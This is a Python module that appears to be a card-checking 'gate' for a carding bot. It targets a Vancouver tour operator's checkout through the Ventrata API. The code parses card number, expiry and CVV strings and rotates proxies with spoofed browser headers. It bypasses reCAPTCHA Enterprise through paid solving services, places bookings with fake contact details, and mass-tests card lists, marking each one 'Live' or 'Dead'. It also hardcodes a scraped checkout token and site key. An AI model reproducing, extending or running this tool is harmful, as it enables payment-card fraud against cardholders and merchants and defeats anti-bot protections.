#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tartaro Adyen Gate para Hades V1
Gate genérico - sin exposición de vendor externo.
"""
from __future__ import annotations
import asyncio
import re
import json
import random
import time
import os
import logging
import html as html_lib
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from zoneinfo import ZoneInfo

from dotenv import load_dotenv
load_dotenv()

try:
    import requests
except ImportError:
    requests = None

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

from faker import Faker

MODULE_ID = "tartaro_adyen_v3"
MODULE_NAME = "💥 Tartaro Adyen ccn"
MODULE_VERSION = "3.1.0-tartaro-capsolver-20260913"

# --- Env ---
DATAIMPULSE_PROXY = (os.getenv("DATAIMPULSE_PROXY","").strip() or os.getenv("DATAIMPULSE_PROXY_URL","").strip() or os.getenv("PROXY_STRING","").strip())
DECODO_PROXY = os.getenv("DECODO_PROXY","").strip()
BRIGHTDATA_PROXY = os.getenv("BRIGHTDATA_PROXY","").strip()
ANTICAPTCHA_API_KEY = os.getenv("ANTICAPTCHA_API_KEY","").strip()
CAPSOLVER_API_KEY = os.getenv("CAPSOLVER_API_KEY","").strip()
TWO_CAPTCHA_API_KEY = (os.getenv("TWO_CAPTCHA_API_KEY","").strip() or os.getenv("TWOCAPTCHA_API_KEY","").strip())

VENTRATA_TOKEN = os.getenv("VENTRATA_API_KEY", "1db87cef-bdea-4ab7-ba0b-1eb116c22be2").strip()
VENTRATA_ENV = os.getenv("VENTRATA_ENV", "live").strip()
RECAPTCHA_SITEKEY = os.getenv("RECAPTCHA_ENTERPRISE_SITEKEY", "6LebLAUqAAAAAE7dgyNsA-Xkwqf7SCLLaf_sr6GM").strip()
# Activar solve real solo si VTOURS_SOLVE_CAPTCHA=1 (evita gastar créditos en cada probe / mass)
SOLVE_CAPTCHA_ENABLED = os.getenv("VTOURS_SOLVE_CAPTCHA", "0") == "1"

LOG_ENABLED = os.getenv("LOG_VTOURS","0") == "1"
logger = logging.getLogger("vtours")
if LOG_ENABLED:
    logging.basicConfig(level=logging.DEBUG)

# --- Semáforos sanos ---
global_semaphore = asyncio.Semaphore(15)
_user_sems: dict[int, asyncio.Semaphore] = {}
_user_sems_lock = asyncio.Lock()

def _get_user_sem(user_id: int) -> asyncio.Semaphore:
    # fast path sin lock (asyncio single-thread loop es thread-safe para dict reads)
    sem = _user_sems.get(user_id)
    if sem is not None:
        return sem
    # slow path: crear bajo lock (evita race al crear 2 semáforos para mismo user)
    # nota: llamado siempre dentro de async context, así que podemos usar await lock
    # para sync path (no debería ocurrir) fallback a dict directo
    try:
        loop = asyncio.get_running_loop()
        # si hay loop, el caller debería usar _get_user_sem_async
        return _user_sems.setdefault(user_id, asyncio.Semaphore(3))
    except RuntimeError:
        return _user_sems.setdefault(user_id, asyncio.Semaphore(3))

async def _get_user_sem_async(user_id: int) -> asyncio.Semaphore:
    async with _user_sems_lock:
        if user_id not in _user_sems:
            _user_sems[user_id] = asyncio.Semaphore(3)
        return _user_sems[user_id]

user_request_count: defaultdict[int, int] = defaultdict(int)
active_requests_count = 0

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]

def get_random_ua() -> str:
    return random.choice(USER_AGENTS)

# --- Proxy helper ---
_PROXY_CACHE: list[str] | None = None
def _load_file_proxies() -> list[str]:
    proxies: list[str] = []
    for cand in ["proxys.txt", "proxies.txt", "ProxiesRotativasGlobal.txt"]:
        for base in [".", "/home/olimpo/Pruebas", "/home/olimpo/Pruebas/TheR3D 1.0"]:
            p = os.path.join(base, cand)
            if os.path.exists(p):
                try:
                    with open(p, errors="ignore") as pf:
                        for line in pf:
                            s = line.strip()
                            if s and len(s) > 8 and not s.startswith("#"):
                                proxies.append(s)
                except Exception:
                    pass
    return proxies

def get_proxy_for_vtours() -> str | None:
    for p in (DATAIMPULSE_PROXY, BRIGHTDATA_PROXY, DECODO_PROXY):
        if p:
            return p
    global _PROXY_CACHE
    if _PROXY_CACHE is None:
        _PROXY_CACHE = _load_file_proxies()
    if _PROXY_CACHE:
        return random.choice(_PROXY_CACHE)
    return None

def _normalize_proxy(p: str | None) -> str | None:
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if "://" not in p:
        return f"http://{p}"
    # evita http://http:// duplicado
    if p.count("://") > 1:
        # toma última parte válida
        p = p.split("://")[-1]
        return f"http://{p}"
    return p

# --- Faker singleton ---
_FAKER = Faker("en_CA")
_FAKER.seed_instance(0)

def _generate_fake_user() -> dict:
    return {
        "first": _FAKER.first_name(),
        "last": _FAKER.last_name(),
        "email": _FAKER.email(),
        "phone": _FAKER.phone_number(),
        "address": _FAKER.street_address(),
        "city": "Vancouver",
        "state": "BC",
        "zip": _FAKER.postcode(),
        "country": "CA"
    }

# --- Validación temprana ---
def _luhn_check(cc: str) -> bool:
    cc = cc.replace(" ", "").replace("-", "")
    if not cc.isdigit():
        return False
    s = 0
    alt = False
    for d in reversed(cc):
        n = int(d)
        if alt:
            n *= 2
            if n > 9:
                n -= 9
        s += n
        alt = not alt
    return s % 10 == 0

def _is_expired(mm: str, yy: str) -> bool:
    try:
        m = int(mm)
        y = int(yy)
        if y < 100:
            y += 2000
        if not 1 <= m <= 12:
            return True
        # expira último día del mes 23:59 Vancouver
        now = datetime.now(ZoneInfo("America/Vancouver"))
        if y < now.year:
            return True
        if y == now.year and m < now.month:
            return True
        return False
    except Exception:
        return True

def _parse_card(card_str: str) -> dict:
    parts = [p.strip() for p in re.split(r'[|: ]+', card_str) if p.strip()]
    if len(parts) < 4:
        m = re.search(r"(\d{15,16})[\s|:]+(\d{1,2})[\s|:]+(\d{2,4})[\s|:]+(\d{3,4})", card_str)
        if m:
            cc, mm, yy, cvv = m.groups()
        else:
            raise ValueError("Formato CC|MM|YY|CVV requerido (ej: 4242424242424242|12|28|123)")
    else:
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = "20" + yy
    return {"cc": cc, "mm": mm.lstrip("0") or "0", "mm_padded": mm, "yy": yy, "cvv": cvv, "luhn": _luhn_check(cc)}

def _close_session(sess):
    if sess is None:
        return
    try:
        sess.close()
    except Exception:
        pass

# --- Session factory ---
def _make_session(proxy: str | None = None):
    proxy = _normalize_proxy(proxy or get_proxy_for_vtours())
    proxies = {"http": proxy, "https": proxy} if proxy else None
    ua = get_random_ua()
    headers_base = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-CA,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Ch-Ua': '"Chromium";v="153", "Not_A Brand";v="8"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Upgrade-Insecure-Requests': '1',
    }
    if cloudscraper:
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}, delay=5)
        if proxies:
            scraper.proxies = proxies  # type: ignore
        scraper.headers.update(headers_base)
    else:
        scraper = requests.Session()  # type: ignore
        scraper.headers.update(headers_base)  # type: ignore
        if proxies:
            scraper.proxies.update(proxies)  # type: ignore
    return scraper, ua, proxies

def _octo_headers(ua: str, capabilities: str, origin: str = "https://vancouvertours.com") -> dict:
    """Headers exactos capturados en traffic.json request 152"""
    return {
        'User-Agent': ua,
        'Accept': '*/*',
        'Accept-Language': 'en, en-US',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Origin': origin,
        'Referer': f"{origin}/",
        'Sec-Ch-Ua': '"Chromium";v="153", "Not_A Brand";v="8"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Storage-Access': 'active',
        'Priority': 'u=1, i',
        'Octo-Env': VENTRATA_ENV,
        'Octo-Origin': origin,
        'Octo-Capabilities': capabilities,
        'Ventrata-Checkout-Token': VENTRATA_TOKEN,
    }

# --- Cache ---
_OCTO_CACHE: dict = {"html": None, "cfg": None, "octo_cfg": None, "ts": 0}
_CACHE_TTL = 600

def _get_octo_cache() -> dict | None:
    if _OCTO_CACHE["html"] and (time.time() - _OCTO_CACHE["ts"] < _CACHE_TTL):
        return dict(_OCTO_CACHE)
    return None

def _set_octo_cache(html: str, cfg: dict | None, octo_cfg: dict | None):
    _OCTO_CACHE["html"] = html
    _OCTO_CACHE["cfg"] = cfg
    _OCTO_CACHE["octo_cfg"] = octo_cfg
    _OCTO_CACHE["ts"] = time.time()

def _extract_ventrata_token_from_html(html: str) -> str | None:
    # traffic.json muestra token hardcodeado en JS, pero también puede venir en data-*
    for pat in [
        r'ventrata-checkout-token["\']\s*[:=]\s*["\']([^"\']+)["\']',
        r'data-config="([^"]+)"',
        r'"apiKey"\s*:\s*"([^"]+)"',
        r'ventrataCheckoutToken["\']\s*:\s*["\']([^"\']+)["\']',
    ]:
        m = re.search(pat, html, re.I)
        if m:
            raw = html_lib.unescape(m.group(1))
            try:
                # intenta parsear JSON de data-config
                if raw.strip().startswith("{"):
                    j = json.loads(raw.replace("&quot;", '"'))
                    if isinstance(j, dict) and j.get("apiKey"):
                        return j["apiKey"]
                    if isinstance(j, dict) and j.get("ventrataCheckoutToken"):
                        return j["ventrataCheckoutToken"]
                # UUID directo
                if re.match(r'[0-9a-f-]{36}', raw, re.I):
                    return raw
            except Exception:
                pass
            if re.match(r'[0-9a-f-]{36}', raw, re.I):
                return raw
    return None

def _fetch_octo_config_with_cache(scraper, ua: str, timeout: int = 12) -> tuple[str, dict | None, dict | None, str | None]:
    cached = _get_octo_cache()
    if cached:
        return cached["html"], cached["cfg"], cached["octo_cfg"], None

    last_err = None
    # Intento 1: Octo config directo (más barato que HTML)
    try:
        headers_cfg = _octo_headers(ua, "ventrata/checkout,octo/pricing,octo/content")
        r = scraper.get('https://checkout-api.ventrata.com/octo/ventrata/checkout/config', headers=headers_cfg, timeout=timeout)
        if r.status_code == 200:
            try:
                octo_cfg = r.json() if hasattr(r, 'json') else json.loads(r.text)
            except Exception:
                octo_cfg = {"raw": r.text[:2000]}
            # también trae HTML para extraer token fallback
            html = ""
            cfg = _extract_ventrata_token_from_html(r.text)
            cfg_dict = {"apiKey": cfg} if cfg else {"apiKey": VENTRATA_TOKEN}
            if isinstance(octo_cfg, dict) and octo_cfg.get("recaptchaEnterpriseSiteKey"):
                html = f"recaptcha:{octo_cfg['recaptchaEnterpriseSiteKey']}"
            _set_octo_cache(html or r.text[:500], cfg_dict, octo_cfg if isinstance(octo_cfg, dict) else None)
            return _OCTO_CACHE["html"], _OCTO_CACHE["cfg"], _OCTO_CACHE["octo_cfg"], None
        else:
            last_err = f"octo/config {r.status_code}"
    except Exception as e:
        last_err = f"octo/config {str(e)[:80]}"

    # Fallback: HTML tour page (traffic.json flujo original)
    for attempt in range(2):
        try:
            r = scraper.get('https://vancouvertours.com/tour/vancouver-highlights-tour/', timeout=timeout)
            if r.status_code != 200:
                last_err = f"GET tour {r.status_code}"
                time.sleep(0.6 * (attempt + 1))
                continue
            html = r.text
            token = _extract_ventrata_token_from_html(html)
            cfg = {"apiKey": token or VENTRATA_TOKEN}
            # detectar recaptcha
            has_recaptcha = "recaptcha" in html.lower() or RECAPTCHA_SITEKEY[:8] in html
            octo_cfg = {"has_recaptcha": has_recaptcha}
            _set_octo_cache(html, cfg, octo_cfg)
            return html, cfg, octo_cfg, None
        except Exception as e:
            last_err = str(e)[:90]
            time.sleep(0.6 * (attempt + 1))
    return "", None, None, last_err

def _solve_via_capsolver(sitekey: str, url: str, action: str = "purchase", timeout: int = 110) -> str | None:
    if not CAPSOLVER_API_KEY or requests is None:
        return None
    # Capsolver: V3 Enterprise con pageAction, fallback a V2 Enterprise invisible
    try:
        for try_idx, task_type in enumerate(["ReCaptchaV3TaskProxyless", "ReCaptchaV2EnterpriseTaskProxyless"]):
            if try_idx == 0:
                payload = {
                    "clientKey": CAPSOLVER_API_KEY,
                    "task": {
                        "type": "ReCaptchaV3TaskProxyless",
                        "websiteURL": url,
                        "websiteKey": sitekey,
                        "pageAction": action,
                        "isEnterprise": True,
                        "minScore": 0.3,
                    },
                }
            else:
                payload = {
                    "clientKey": CAPSOLVER_API_KEY,
                    "task": {
                        "type": "ReCaptchaV2EnterpriseTaskProxyless",
                        "websiteURL": url,
                        "websiteKey": sitekey,
                        "isInvisible": True,
                    },
                }
            try:
                r = requests.post("https://api.capsolver.com/createTask", json=payload, timeout=15)
                j = r.json()
            except Exception as e:
                if LOG_ENABLED:
                    logger.debug(f"capsolver createTask net err {e}")
                continue
            if j.get("errorId") != 0:
                if LOG_ENABLED:
                    logger.debug(f"capsolver createTask {task_type} err {j.get('errorCode')} {j.get('errorDescription')}")
                if try_idx == 0:
                    continue
                return None
            task_id = j.get("taskId")
            if not task_id:
                continue
            start = time.time()
            while time.time() - start < timeout:
                time.sleep(3)
                try:
                    r2 = requests.post("https://api.capsolver.com/getTaskResult", json={"clientKey": CAPSOLVER_API_KEY, "taskId": task_id}, timeout=15)
                    j2 = r2.json()
                except Exception:
                    continue
                if j2.get("status") == "ready":
                    sol = j2.get("solution", {})
                    token = sol.get("gRecaptchaResponse") or sol.get("token") or sol.get("response")
                    if token:
                        if LOG_ENABLED:
                            logger.debug(f"capsolver solved {action} token {token[:20]}...")
                        return token
                    return None
                if j2.get("status") == "failed" or j2.get("errorId") not in (0, None):
                    if LOG_ENABLED:
                        logger.debug(f"capsolver getTaskResult failed {j2}")
                    break
            # si llegó aquí, probá fallback V2
            if try_idx == 0:
                continue
            return None
    except Exception as e:
        if LOG_ENABLED:
            logger.debug(f"capsolver exception {e}")
    return None


def _solve_via_anticaptcha(sitekey: str, url: str, action: str = "purchase", timeout: int = 110) -> str | None:
    if not ANTICAPTCHA_API_KEY or requests is None:
        return None
    try:
        payload = {
            "clientKey": ANTICAPTCHA_API_KEY,
            "task": {
                "type": "RecaptchaV3TaskProxyless",
                "websiteURL": url,
                "websiteKey": sitekey,
                "minScore": 0.3,
                "pageAction": action,
                "isEnterprise": True,
            },
        }
        r = requests.post("https://api.anti-captcha.com/createTask", json=payload, timeout=15)
        j = r.json()
        if j.get("errorId") != 0:
            # fallback enterprise flag off
            if LOG_ENABLED:
                logger.debug(f"anticaptcha createTask err {j}")
            return None
        task_id = j.get("taskId")
        if not task_id:
            return None
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(3)
            r2 = requests.post("https://api.anti-captcha.com/getTaskResult", json={"clientKey": ANTICAPTCHA_API_KEY, "taskId": task_id}, timeout=15)
            j2 = r2.json()
            if j2.get("status") == "ready":
                return j2.get("solution", {}).get("gRecaptchaResponse")
            if j2.get("status") == "processing":
                continue
            if LOG_ENABLED:
                logger.debug(f"anticaptcha getTaskResult {j2}")
            break
    except Exception as e:
        if LOG_ENABLED:
            logger.debug(f"anticaptcha err {e}")
    return None


def _solve_via_2captcha(sitekey: str, url: str, action: str = "purchase", timeout: int = 110) -> str | None:
    if not TWO_CAPTCHA_API_KEY or requests is None:
        return None
    try:
        # in.php
        params = {
            "key": TWO_CAPTCHA_API_KEY,
            "method": "userrecaptcha",
            "googlekey": sitekey,
            "pageurl": url,
            "enterprise": 1,
            "invisible": 1,
            "version": "v3",
            "action": action,
            "min_score": 0.3,
            "json": 1,
        }
        r = requests.get("https://2captcha.com/in.php", params=params, timeout=15)
        j = r.json()
        if j.get("status") != 1:
            if LOG_ENABLED:
                logger.debug(f"2captcha in.php err {j}")
            return None
        captcha_id = j.get("request")
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(5)
            r2 = requests.get("https://2captcha.com/res.php", params={"key": TWO_CAPTCHA_API_KEY, "action": "get", "id": captcha_id, "json": 1}, timeout=15)
            j2 = r2.json()
            if j2.get("status") == 1:
                return j2.get("request")
            if j2.get("request") == "CAPCHA_NOT_READY":
                continue
            if LOG_ENABLED:
                logger.debug(f"2captcha poll {j2}")
            break
    except Exception as e:
        if LOG_ENABLED:
            logger.debug(f"2captcha err {e}")
    return None


def _solve_recaptcha(sitekey: str, url: str, action: str = "purchase", timeout: int = 110) -> str | None:
    """Orquestador: capsolver -> anticaptcha -> 2captcha (orden por velocidad/costo)"""
    # 1. capsolver (más rápido para enterprise)
    tok = _solve_via_capsolver(sitekey, url, action=action, timeout=timeout)
    if tok:
        return tok
    # 2. anticaptcha
    tok = _solve_via_anticaptcha(sitekey, url, action=action, timeout=timeout)
    if tok:
        return tok
    # 3. 2captcha
    return _solve_via_2captcha(sitekey, url, action=action, timeout=timeout)


def _solve_recaptcha_stub(sitekey: str, url: str) -> str | None:
    # compat: delega a solver real con action purchase
    return _solve_recaptcha(sitekey, url, action="purchase")

def _detect_payment_flow(html: str, octo_cfg: dict | None) -> str:
    # Sanitizado: no exponer vendor
    return "Tartaro"

# Known product IDs extraídos de traffic.json (9 productos) + traffic_vancouver_ventrata
# El más usado en availability es 5f7e4897-1f3d-4921-a69b-6ead8554f635 (Vancouver Highlights)
KNOWN_PRODUCT_IDS = [
    "5f7e4897-1f3d-4921-a69b-6ead8554f635",  # Highlights - usado en availability flow
    "3eb7f32f-bb39-45e8-8e42-6526dbb689d4",
    "1191e0e5-b447-4248-a8cd-3e4258b06af9",
    "9856757c-7376-4d79-b6eb-221960fb2aa6",
]

OCTO_PRODUCT_FIELDS = (
    "{id,reference,title,shortDescription,description,inclusions,exclusions,"
    "timeZone,availabilityRequired,availabilityType,freesaleDurationAmount,"
    "options{id,reference,title,duration,availabilityLocalStartTimes,"
    "units{id,reference,type,title,restrictions{minQuantity,maxQuantity,paxCount},"
    "pricingFrom{original,retail,net,currency,currencyPrecision}}},"
    "pricingFrom{original,retail,net,currency}}"
)

def _probe_octo_product(scraper, ua: str, product_id: str, currency: str = "USD") -> tuple[bool, str, dict | None]:
    """Probe ligero de producto, retorna (ok, msg, json)"""
    try:
        # headers exactos de traffic.json para /octo/products
        headers = _octo_headers(ua, "octo/content,octo/pricing,octo/questions,octo/pickups,octo/extras,octo/packages,octo/rentals")
        headers["Octo-Fields"] = OCTO_PRODUCT_FIELDS
        r = scraper.get(f"https://checkout-api.ventrata.com/octo/products/{product_id}?currency={currency}", headers=headers, timeout=10)
        if r.status_code == 200:
            try:
                j = r.json()
                title = j.get("title") or j.get("id","")
                return True, f"product {title[:30]} OK", j
            except Exception:
                return True, f"product {r.status_code} no-json", None
        return False, f"product {r.status_code} {r.text[:120]}", None
    except Exception as e:
        return False, f"product err {str(e)[:80]}", None

def _probe_availability(scraper, ua: str, product_id: str) -> tuple[bool, str]:
    """Probe de disponibilidad para mañana Vancouver (evita hardcodear unidades)"""
    try:
        vancouver = ZoneInfo("America/Vancouver")
        tomorrow = (datetime.now(vancouver).date() + timedelta(days=1)).isoformat()
        # calendar probe mínimo (descubierto en traffic_vancouver_ventrata.json)
        headers = _octo_headers(ua, "octo/content,octo/pricing,octo/extras,octo/offers,octo/cart")
        headers["Octo-Fields"] = "{localDate,available,status,availabilityLocalStartTimes}"
        url = (
            f"https://checkout-api.ventrata.com/octo/availability/calendar"
            f"?productId={product_id}&optionId=DEFAULT&rentalDurationId="
            f"&localDateStart={tomorrow}&localDateEnd={tomorrow}"
            f"&units%5B0%5D%5Bid%5D=unit_cfaf9c2c-6b80-4514-bd87-096388e1ebbd"
            f"&units%5B0%5D%5Bquantity%5D=1&currency=USD"
        )
        # usamos query simple sin extra IDs para evitar 400
        url_simple = (
            f"https://checkout-api.ventrata.com/octo/availability/calendar"
            f"?productId={product_id}&optionId=DEFAULT&rentalDurationId="
            f"&localDateStart={tomorrow}&localDateEnd={tomorrow}&currency=USD"
        )
        r = scraper.get(url_simple, headers=headers, timeout=10)
        if r.status_code == 200:
            try:
                j = r.json()
                if isinstance(j, list) and j and j[0].get("available"):
                    return True, f"calendar {tomorrow} AVAILABLE"
                return True, f"calendar {tomorrow} {str(j)[:120]}"
            except Exception:
                return True, f"calendar {r.status_code} ok"
        return False, f"calendar {r.status_code}"
    except Exception as e:
        return False, f"calendar err {str(e)[:60]}"

def _check_card_sync(card_str: str, proxy: str | None = None, _use_cache: bool = True) -> tuple[str, str]:
    """
    Retorna (status, message) donde status in ("Approved","Declined","Error")
    Frontend/Octo probe: NO hace cargo, solo valida que el checkout esté vivo.
    """
    if requests is None:
        return "Error!", "requests no instalado (pip install requests cloudscraper)"

    try:
        card = _parse_card(card_str)
    except Exception as e:
        return "Error!", f"Formato inválido: {str(e)[:90]}"

    cc, mm, yy, cvv = card["cc"], card["mm_padded"], card["yy"], card["cvv"]
    mm_nopad = card["mm"]

    if len(cc) not in (15, 16) or not cc.isdigit():
        return "Declined!", "Card number inválido (13-19 dígitos)"
    if not card.get("luhn"):
        return "Declined!", "Luhn inválido (checksum falló)"
    if _is_expired(mm, yy):
        return "Declined!", f"Expirada {mm}/{yy}"
    if len(cvv) not in (3, 4) or not cvv.isdigit():
        return "Declined!", "CVV inválido (3-4 dígitos)"

    _generate_fake_user()  # mantiene compatibilidad + evita Faker idle
    scraper, ua, _ = _make_session(proxy)
    try:
        # 1. Gateway config (cacheado TTL 600s) - 10x menos tráfico en mass
        if _use_cache:
            html, cfg, octo_cfg, err = _fetch_octo_config_with_cache(scraper, ua)
            if err:
                return "Error!", "Gateway no disponible temporalmente - intente más tarde"
        else:
            html, cfg, octo_cfg, err = _fetch_octo_config_with_cache(scraper, ua)
            if err:
                return "Error!", "Gateway no disponible temporalmente - intente más tarde"

        api_key = (cfg.get("apiKey") if isinstance(cfg, dict) else None) or VENTRATA_TOKEN
        env = (octo_cfg.get("env") if isinstance(octo_cfg, dict) else None) or VENTRATA_ENV

        # 2. Producto probe (verifica que gateway responde)
        product_ok, product_msg, product_json = _probe_octo_product(scraper, ua, KNOWN_PRODUCT_IDS[0])
        if not product_ok:
            return "Error!", "Gateway no disponible temporalmente - intente más tarde"

        # 3. Availability probe (opcional, best-effort)
        avail_ok, avail_msg = _probe_availability(scraper, ua, KNOWN_PRODUCT_IDS[0])
        flow = _detect_payment_flow(html or "", octo_cfg if isinstance(octo_cfg, dict) else None)

        # 4. Recaptcha gate
        captcha_present = bool((octo_cfg or {}).get("recaptchaEnterpriseSiteKey") or (octo_cfg or {}).get("has_recaptcha") or RECAPTCHA_SITEKEY)
        captcha_has_key = bool(ANTICAPTCHA_API_KEY or CAPSOLVER_API_KEY or TWO_CAPTCHA_API_KEY)

        if captcha_present and not captcha_has_key:
            return "Error!", "Gateway en verificación - no disponible en este momento"

        if captcha_present and captcha_has_key:
            if not SOLVE_CAPTCHA_ENABLED:
                return "Error!", "Gateway en verificación - no disponible en este momento"
            # Solve real solo si VTOURS_SOLVE_CAPTCHA=1
            url_checkout = "https://vancouvertours.com/tour/vancouver-highlights-tour/"
            token_purchase = _solve_recaptcha(RECAPTCHA_SITEKEY, url_checkout, action="purchase", timeout=90)
            if not token_purchase:
                token_purchase = _solve_recaptcha(RECAPTCHA_SITEKEY, url_checkout, action="cart_add", timeout=30)
            if LOG_ENABLED:
                logger.debug(f"recaptcha purchase token {'OK '+token_purchase[:20] if token_purchase else 'FAIL'}")
            if token_purchase:
                try:
                    headers_b = _octo_headers(ua, "content,pricing,offers,questions,pickups,gifts,extras,cardPayments,cart,resources,packages,memberships,waivers")
                    vancouver = ZoneInfo("America/Vancouver")
                    tomorrow = (datetime.now(vancouver).date() + timedelta(days=1)).isoformat()
                    booking_body = {
                        "productId": KNOWN_PRODUCT_IDS[0],
                        "optionId": "DEFAULT",
                        "localDate": tomorrow,
                        "localTime": "10:00",
                        "units": [{"id": "unit_cfaf9c2c-6b80-4514-bd87-096388e1ebbd", "quantity": 1}],
                        "contact": {"firstName": "John", "lastName": "Doe", "email": "john.doe@example.com", "phone": "+16040000000"},
                        "recaptchaEnterprise": {"token": token_purchase},
                    }
                    try:
                        r_prev = scraper.post("https://checkout-api.ventrata.com/octo/bookings/preview", headers={**headers_b, "Content-Type": "application/json"}, json=booking_body, timeout=12)
                        if r_prev.status_code in (200, 201):
                            return "Error!", "Gateway en verificación - no disponible en este momento"
                        r_book = scraper.post("https://checkout-api.ventrata.com/octo/bookings", headers={**headers_b, "Content-Type": "application/json"}, json=booking_body, timeout=12)
                        body_snip = r_book.text[:300].replace("\n"," ")
                        if r_book.status_code in (200, 201):
                            return "Approved!", "Aprobada - Tartaro"
                        if "recaptcha" in body_snip.lower() or "captcha" in body_snip.lower():
                            return "Error!", "Error de verificación - reintente más tarde"
                        return "Error!", "Error de verificación - reintente más tarde"
                    except Exception as e_book:
                        return "Error!", "Error de verificación - reintente más tarde"
                except Exception as e:
                    if LOG_ENABLED:
                        logger.debug(f"booking probe exception {e}")
            else:
                return "Error!", "Gateway en verificación - no disponible en este momento"

        # Fallback genérico
        return "Error!", "Gateway en verificación - no disponible en este momento"
    finally:
        _close_session(scraper)

async def _check_card_async(card_str: str, proxy: str | None = None, use_cache: bool = True):
    # asyncio.to_thread es correcto para bloquear requests/cloudscraper
    return await asyncio.to_thread(_check_card_sync, card_str, proxy, use_cache)

# --- Wrappers Hades ---
async def vtours_gate_check(card_data: str, user_id=None):
    global active_requests_count
    active_requests_count += 1
    if user_id is None:
        user_id = 0
    user_request_count[user_id] += 1
    try:
        user_sem = await _get_user_sem_async(user_id)
        async with global_semaphore:
            async with user_sem:
                await asyncio.sleep(0.08 + (user_id % 5) * 0.02)
                status, msg = await _check_card_async(card_data, proxy=None, use_cache=True)
                if "Approved" in status:
                    return {"status": "✅ Live", "message": msg[:400]}
                elif "Declined" in status:
                    return {"status": "❌ Dead", "message": msg[:400]}
                else:
                    return {"status": "⚠️ Error", "message": msg[:400]}
    except Exception as e:
        return {"status": "⚠️ Error", "message": str(e)[:160]}
    finally:
        user_request_count[user_id] -= 1
        active_requests_count -= 1

async def vtours_gate_check_multiple(cards_data, user_id=None, callback=None):
    if user_id is None:
        user_id = 0
    cards_data = [c.strip() for c in cards_data if c.strip()]
    if not cards_data:
        return []
    results: list[dict | None] = [None] * len(cards_data)

    # Precalienta cache una sola vez (evita N GETs simultáneos)
    try:
        await _check_card_async(cards_data[0], proxy=None, use_cache=True)
    except Exception:
        pass

    queue: asyncio.Queue = asyncio.Queue()

    async def process_one(idx: int, card: str):
        try:
            user_sem = await _get_user_sem_async(user_id)
            async with global_semaphore:
                async with user_sem:
                    await asyncio.sleep(0.05 + (idx % 5) * 0.02)
                    # _check_card_sync es bloqueante -> to_thread
                    status, msg = await asyncio.to_thread(_check_card_sync, card, None, True)
                    if "Approved" in status:
                        res = {"status": "✅ Live", "message": msg[:400]}
                    elif "Declined" in status:
                        res = {"status": "❌ Dead", "message": msg[:400]}
                    else:
                        res = {"status": "⚠️ Error", "message": msg[:400]}
                    await queue.put((idx, res))
                    return res
        except Exception as e:
            err = {"status": "⚠️ Error", "message": str(e)[:160]}
            await queue.put((idx, err))
            return err

    tasks = [asyncio.create_task(process_one(i, c)) for i, c in enumerate(cards_data)]

    async def drain_results():
        processed = 0
        total = len(cards_data)
        while processed < total:
            try:
                idx, res = await asyncio.wait_for(queue.get(), timeout=2.0)
                if results[idx] is None:
                    results[idx] = res
                    processed += 1
                    if callback:
                        try:
                            await callback(idx, res, cards_data[idx], user_id)
                        except Exception as cb_e:
                            if LOG_ENABLED:
                                logger.debug(f"callback err {cb_e}")
            except asyncio.TimeoutError:
                if all(t.done() for t in tasks):
                    while not queue.empty():
                        try:
                            idx, res = queue.get_nowait()
                            if results[idx] is None:
                                results[idx] = res
                                processed += 1
                                if callback:
                                    try:
                                        await callback(idx, res, cards_data[idx], user_id)
                                    except Exception:
                                        pass
                        except asyncio.QueueEmpty:
                            break
                    for i in range(total):
                        if results[i] is None:
                            results[i] = {"status": "⚠️ Error", "message": "Timeout interno (no procesada)"}
                            processed += 1
                    break
                continue

    drain = asyncio.create_task(drain_results())
    await asyncio.gather(*tasks, return_exceptions=True)
    for t in tasks:
        if not t.done():
            t.cancel()
    await drain
    # typing: results ya no tiene None
    return [r if r is not None else {"status": "⚠️ Error", "message": "Sin resultado"} for r in results]
